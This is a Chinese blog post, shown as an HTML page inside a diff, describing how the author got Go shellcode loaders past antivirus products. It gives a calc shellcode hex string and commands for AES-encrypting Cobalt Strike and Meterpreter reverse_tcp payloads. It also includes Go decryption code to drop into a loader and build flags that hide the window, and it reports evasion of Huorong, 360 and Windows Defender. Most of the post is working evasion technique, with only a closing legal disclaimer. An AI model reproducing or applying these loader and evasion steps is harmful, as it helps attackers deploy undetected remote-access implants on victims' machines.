@@ -1,0 +1,407 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Go_Shellcode免杀尝试（火60卫士OK） | c0ys</title>
+<link rel="shortcut icon" href="https://c0ys.cn/favicon.ico?v=1656907333431">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0ys.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Go_Shellcode免杀尝试（火60卫士OK） | c0ys - Atom Feed" href="https://c0ys.cn/atom.xml">
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="robots" content="nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="baiduspider" content="noindex, nofollow">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+
+<script>
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      const hitokoto = document.getElementById('hitokoto_text')
+      hitokoto.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      hitokoto.innerText = data.hitokoto
+    })
+    .catch(console.error)
+</script>
+
+<script>
+  var _hmt = _hmt || [];
+  (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?93f5a2255c8226ec27177b0c251feb9f";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+  
+    <meta name="description" content="前言
+起因是这个，文章内容不错，但当事人赶到的时候，已经不免杀了，我加上两层aes以及修改密钥也不行。但借着思路，移花接木，这才有了这篇文章。
+
+关于具体效果，也挺惊讶的，因为本人之前没接触过go，也从未上手过免杀，而且这两个找的githu..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0ys.cn">
+  <img class="avatar" src="https://c0ys.cn/images/avatar.png?v=1656907333431" alt="">
+  </a>
+  <h1 class="site-title">
+    c0ys
+  </h1>
+  <p class="site-description" id="hitokoto">
+    <a id="hitokoto_text"> 吾心吾行澄如明镜，所作所为皆为正义。</a>
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://c0ys.cn/post/talk" class="menu">
+          留言
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Go_Shellcode免杀尝试（火60卫士OK）
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-28
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://bu.dusays.com/2022/03/28/95e7a4af27918.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h1 id="前言">前言</h1>
+<p>起因是这个，文章内容不错，但当事人赶到的时候，<s>已经不免杀了</s>，我加上两层aes以及修改密钥也不行。但借着思路，移花接木，这才有了这篇文章。</p>
+<blockquote>
+<p>关于具体效果，也挺惊讶的，因为本人之前没接触过go，也从未上手过免杀，而且这两个找的github项目也是自己手动随便找的，没有人指导，所以过杀软的那一刻，惊喜和成就感爆棚。</p>
+</blockquote>
+<h1 id="项目一">项目一</h1>
+<p>shellcode AES加密+shellcode加载器</p>
+<h2 id="思路">思路</h2>
+<p>shellcode加载器采用的是：<a href="https://github.com/k3rwin/shellcode-bypass-go?ref=golangexample.com">https://github.com/k3rwin/shellcode-bypass-go</a></p>
+<p>加密部分采用：<a href="https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/ShellcodeUtils/main.go">https://github.com/Ne0nd0g/go-shellcode/blob/master/cmd/ShellcodeUtils/main.go</a></p>
+<blockquote>
+<p>其实加载器也可以用<code>go-shellcode</code>这个项目里，项目内代码给的很全。但是由于我先接触的是<code>k3rwin</code>这个作者的代码项目，也是我魔改的部分shellcode加载器。</p>
+</blockquote>
+<h3 id="shellcode采用">shellcode采用</h3>
+<p>注意我这里，一开始是没成功的。</p>
+<figure data-type="image" tabindex="1"><img src="https://bu.dusays.com/2022/03/28/b682521c5608d.png" alt="" loading="lazy"></figure>
+<ul>
+<li>【❌】，cs的x86 shellcode的代码并没有上线</li>
+<li>【✅】，cs的x64 shellcode的cs代码才行，必须勾选x64</li>
+<li>【✅】，msf的<code>windows/x64/meterpreter/reverse_tcp</code>模块可以上线</li>
+</ul>
+<p>也是通过这一步，我在试错中发现，其实杀软杀的是shellcode执行过程中，对shellcode的检测。</p>
+<blockquote>
+<p>但火绒好像很鸡贼，把好多go的shellcode加载器都标记成shellcode后门执行程序，而且内容还都是meterpreter后门，一看就是一刀切类型，心累。就算shellcode内容是计算器也会爆毒成msf的后门。</p>
+</blockquote>
+<ul>
+<li>比如我直接执行msf或者cs的恶意代码，杀</li>
+<li>计算器的poc，过</li>
+</ul>
+<p>附录：calc的poc</p>
+<pre><code class="language-Java">505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3
+</code></pre>
+<p>所以在shellcode执行前过一遍加密即可。</p>
+<h3 id="shellcode加解密">shellcode加解密</h3>
+<p>这里也是在不断试错中成功的。自己先手动编译一下<code>ShellcodeUtils</code>这个项目，加密之前生成好的bin文件，具体github都有，不赘述。</p>
+<blockquote>
+<p>记得运行的时候bin文件采用绝对路径。</p>
+</blockquote>
+<p><strong>加密</strong></p>
+<pre><code class="language-Bash">./main -i '/xxxx/payload_64.bin'  -o '/xxxx/test.bin' -key test -type aes256 -v
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://bu.dusays.com/2022/03/28/fa090ec0ec51d.png" alt="" loading="lazy"></figure>
+<p>每次加密都会生成的随机的salt，nonce。如果想用这次的加密结果，<strong>请记住这些值。</strong></p>
+<p>加密好之后，屏幕会输出加密后的shellcode，<strong>请记住。</strong></p>
+<p><strong>解密</strong></p>
+<p>解密所需要的三要素salt，nonce，key。其中key是一开始指定的。</p>
+<pre><code class="language-Bash">./main -i '/xxx/test.bin' -o '/xxx/dec.bin' -mode decrypt -type aes256 -key test -nonce 02227e5456f20adfbffa0458 -salt e92665d32e83adc7eabe452543d1a8ee4082c12e153ff9ec1b0bd45d33ae8d7fc -v
+</code></pre>
+<h3 id="shellcode解密代码">shellcode解密代码</h3>
+<p>接下来只要在shellcode加载器中，在将shellcode分配到内存之前，进行解密操作即可，这里依葫芦画瓢把解密代码趴过来。</p>
+<pre><code class="language-Go">package main
+
+import (
+  &quot;crypto/aes&quot;
+  &quot;crypto/cipher&quot;
+  &quot;encoding/hex&quot;
+  &quot;fmt&quot;
+  &quot;os&quot;
+
+  // X Packages
+  &quot;golang.org/x/crypto/argon2&quot;
+
+  // 3rd Party
+  &quot;github.com/fatih/color&quot;
+)
+
+func main() {
+  var decryptedBytes []byte
+  var outputBytes []byte
+  var shellcode_hex = &quot;xxxxxx&quot;
+
+  shellcode, err := hex.DecodeString(shellcode_hex)
+
+  saltDecoded, err := hex.DecodeString(&quot;xxxxxx&quot;)
+
+  aesKey := argon2.IDKey([]byte(&quot;xxxxxx&quot;), saltDecoded, 1, 64*1024, 4, 32)
+
+  cipherBlock, err := aes.NewCipher(aesKey)
+  if err != nil {
+    color.Red(fmt.Sprintf(&quot;[!]%s&quot;, err.Error()))
+  }
+
+  gcm, errGcm := cipher.NewGCM(cipherBlock)
+  if err != nil {
+    color.Red(fmt.Sprintf(&quot;[!]%s&quot;, errGcm.Error()))
+    os.Exit(1)
+  }
+
+  decryptNonce, err := hex.DecodeString(&quot;xxxxxx&quot;)
+
+  // var errDecryptedBytes error
+  decryptedBytes, err = gcm.Open(nil, decryptNonce, shellcode, nil)
+
+  if len(decryptedBytes) &lt;= 0 {
+    color.Red(&quot;[!]Decrypted byte slice length is equal to or less than 0&quot;)
+    os.Exit(1)
+  }
+  outputBytes = append(outputBytes, decryptedBytes...)
+  fmt.Println(fmt.Sprintf(&quot;%x&quot;, outputBytes))
+}
+
+</code></pre>
+<p>需要填的加密后的shellcode，salt盐，aeskey，nonce。</p>
+<h2 id="编译">编译</h2>
+<figure data-type="image" tabindex="3"><img src="https://bu.dusays.com/2022/03/28/0e7fed46a95b2.png" alt="" loading="lazy"></figure>
+<pre><code class="language-纯文本"># 运行有黑窗
+go build -o bypass.exe loader.go
+
+# 去黑窗，降低免杀效果
+go build -o bypass.exe -ldflags -H=windowsgui loader.go
+</code></pre>
+<h2 id="vt效果">VT效果</h2>
+<p>火绒，360全家桶，Windows Defender全过。</p>
+<blockquote>
+<p>有时候因为<code>-H=windowsgui</code>的问题，360会爆一下毒，但我个人感觉挺偶然的，时杀时不杀。</p>
+</blockquote>
+<figure data-type="image" tabindex="4"><img src="https://bu.dusays.com/2022/03/28/95e7a4af27918.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://bu.dusays.com/2022/03/28/71f12b42bd232.png" alt="" loading="lazy"></figure>
+<p>不隐藏窗口</p>
+<figure data-type="image" tabindex="6"><img src="https://bu.dusays.com/2022/03/28/d34839119c294.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://bu.dusays.com/2022/03/28/96c5d6f2f0e26.png" alt="" loading="lazy"></figure>
+<p>隐藏窗口</p>
+<figure data-type="image" tabindex="8"><img src="https://bu.dusays.com/2022/03/28/8ae0dca10cc7c.png" alt="" loading="lazy"></figure>
+<h1 id="项目二">项目二</h1>
+<p>shellcode 自写的加密算法+shellcode加载器</p>
+<h2 id="思路-2">思路</h2>
+<p><code>safe6Sec/GolangBypassAV</code></p>
+<p>因为是别人的项目，不赘述，也是在学习项目之余发现的。</p>
+<p>奇怪的是他编译好的gen目录估计太多人直接拿来用了，混淆了过后反而不免杀，反倒是test目录下的加载器现在还是免杀。</p>
+<h2 id="vt效果-2">VT效果</h2>
+<p>用的x64的cs的payload。</p>
+<p>火绒，360如图。</p>
+<figure data-type="image" tabindex="9"><img src="https://bu.dusays.com/2022/03/28/8ae159041f0f1.png" alt="" loading="lazy"></figure>
+<p>wt如下。</p>
+<figure data-type="image" tabindex="10"><img src="https://bu.dusays.com/2022/03/28/8a88a6e949460.png" alt="" loading="lazy"></figure>
+<p>全杀。</p>
+<p>默认编译，有黑框。</p>
+<figure data-type="image" tabindex="11"><img src="https://bu.dusays.com/2022/03/28/56d849b710c6b.png" alt="" loading="lazy"></figure>
+<p>隐藏窗口，关黑窗。</p>
+<figure data-type="image" tabindex="12"><img src="https://bu.dusays.com/2022/03/28/494f0d071c20b.png" alt="" loading="lazy"></figure>
+<h1 id="缺陷">缺陷</h1>
+<ul>
+<li>go编译的exe文件过大，需要upx压缩<br>
+<code>2MB</code>(Go)/<code>10kb</code>(C#)</li>
+<li>免黑框编译，360会报毒。<br>
+隐藏窗口<code>ldflags -H windowsgui</code>（可能降低免杀效果），360有时候抽风盯着杀。</li>
+<li>见光死。</li>
+</ul>
+<p>综上，个人感觉还是c#，c，c++这类底层语言做免杀好些。</p>
+<h1 id="后话">后话</h1>
+<p>学海无涯，免杀涉及的知识面极广，这篇文章只是兴趣之余摆弄了一下，底层各类api调用，和各类杀软习惯针对的部分，这都需要大量的精力。</p>
+<p>只能当工作之余的兴趣研究，时间和能力都不足以支持继续深入。</p>
+<p>但对免杀还是有一定兴趣的，这种尝试性的学习文章可能会偶然更新。</p>
+<p>不多说了，写✍安全报告去了。</p>
+<figure data-type="image" tabindex="13"><img src="https://bu.dusays.com/2022/03/28/0afc49a71f429.png" alt="" loading="lazy"></figure>
+<h1 id="参考的项目">参考的项目</h1>
+<p><a href="https://github.com/k3rwin/shellcode-bypass-go?ref=golangexample.com">https://github.com/k3rwin/shellcode-bypass-go</a></p>
+<blockquote>
+<p>普普通通加载器，是我第一次尝试利用的加载器。</p>
+</blockquote>
+<p><a href="https://github.com/Ne0nd0g/go-shellcode">https://github.com/Ne0nd0g/go-shellcode</a></p>
+<blockquote>
+<p>给了10多种加载方式思路，是我刷到的几个项目的基石，都是基于此项目的造轮子。</p>
+</blockquote>
+<p><a href="https://github.com/safe6Sec/GolangBypassAV">https://github.com/safe6Sec/GolangBypassAV</a></p>
+<blockquote>
+<p>test目录下，思路循序渐进，步步稳扎稳打。在学习思路上给予很大帮助。</p>
+</blockquote>
+<p><a href="https://github.com/Sec-Fork/GoBypass">https://github.com/Sec-Fork/GoBypass</a></p>
+<blockquote>
+<p>基与上面safe6sec项目，再造轮子。</p>
+</blockquote>
+
+                <blockquote>
+                  <p>声明：本博客文章所分享内容仅用于技术交流，禁止用于违法途径，所有渗透都需获取授权！否则需自行承担，本站及原作者不承担相应的后果。</p>
+                </blockquote>
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E9%A1%B9%E7%9B%AE%E4%B8%80">项目一</a>
+<ul>
+<li><a href="#%E6%80%9D%E8%B7%AF">思路</a>
+<ul>
+<li><a href="#shellcode%E9%87%87%E7%94%A8">shellcode采用</a></li>
+<li><a href="#shellcode%E5%8A%A0%E8%A7%A3%E5%AF%86">shellcode加解密</a></li>
+<li><a href="#shellcode%E8%A7%A3%E5%AF%86%E4%BB%A3%E7%A0%81">shellcode解密代码</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BC%96%E8%AF%91">编译</a></li>
+<li><a href="#vt%E6%95%88%E6%9E%9C">VT效果</a></li>
+</ul>
+</li>
+<li><a href="#%E9%A1%B9%E7%9B%AE%E4%BA%8C">项目二</a>
+<ul>
+<li><a href="#%E6%80%9D%E8%B7%AF-2">思路</a></li>
+<li><a href="#vt%E6%95%88%E6%9E%9C-2">VT效果</a></li>
+</ul>
+</li>
+<li><a href="#%E7%BC%BA%E9%99%B7">缺陷</a></li>
+<li><a href="#%E5%90%8E%E8%AF%9D">后话</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E7%9A%84%E9%A1%B9%E7%9B%AE">参考的项目</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0ys.cn/post/NFeKqmZwK/">
+              <h3 class="post-title">
+                企微推送CS上线
+              </h3>
+            </a>
+          </div>
+        
+      
+        
+            <script src="https://cdn.jsdelivr.net/npm/twikoo@1.5.0/dist/twikoo.all.min.js"></script>
+
+<div id="tcomment"></div>
+<script>
+twikoo.init({
+  envId: 'https://talk.c0ys.cn',
+  el: '#tcomment'
+})
+</script> 
+          
+
+        
+
+        <div class="site-footer">
+  Powered by<a href="https://github.com/c0ys" target="_blank">c0ys</a>
+  <a class="rss" href="https://c0ys.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
